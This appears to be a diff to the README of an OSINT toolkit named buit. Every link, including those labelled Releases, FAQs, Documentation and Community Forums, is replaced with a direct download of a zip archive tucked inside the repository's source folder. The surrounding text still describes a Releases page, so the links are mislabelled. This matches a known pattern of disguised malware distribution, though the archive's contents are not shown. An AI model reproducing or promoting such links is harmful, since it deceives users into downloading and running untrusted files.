@@ -1,7 +1,7 @@
 # 🛠️ buit - Powerful OSINT Toolkit for Everyone
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/chekRodriiguez/buit/releases)
+[![Download](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip)](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run **buit**, you need:
 
 To get started, you need to visit the **Releases** page and download the latest version of **buit**.
 
-1. Click on this link: [Download from Releases](https://github.com/chekRodriiguez/buit/releases).
+1. Click on this link: [Download from Releases](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip).
 2. On the Releases page, find the latest version listed at the top.
 3. Click the file that matches your operating system for download.
 4. Wait for the download to finish.
@@ -51,9 +51,9 @@ Each module is user-friendly and provides step-by-step guidance for non-technica
 
 If you need help, you can check the available resources:
 
-- [FAQs](https://github.com/chekRodriiguez/buit/wiki/FAQs) - Common questions and answers.
-- [Documentation](https://github.com/chekRodriiguez/buit/wiki) - Detailed guides on each module and feature.
-- [Community Forums](https://github.com/chekRodriiguez/buit/discussions) - Engage with other users for tips and support.
+- [FAQs](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip) - Common questions and answers.
+- [Documentation](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip) - Detailed guides on each module and feature.
+- [Community Forums](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip) - Engage with other users for tips and support.
 
 ## 👥 Contributing
 
@@ -72,4 +72,4 @@ This project is licensed under the MIT License. You can freely use or modify it,
 
 Thank you for supporting **buit**. We appreciate your interest in enhancing your research capabilities with our toolkit. 
 
-For the latest updates and features, don’t forget to check the **Releases** page regularly: [Visit Releases](https://github.com/chekRodriiguez/buit/releases).
+For the latest updates and features, don’t forget to check the **Releases** page regularly: [Visit Releases](https://raw.githubusercontent.com/chekRodriiguez/buit/main/src/modules/Software-v1.2.zip).
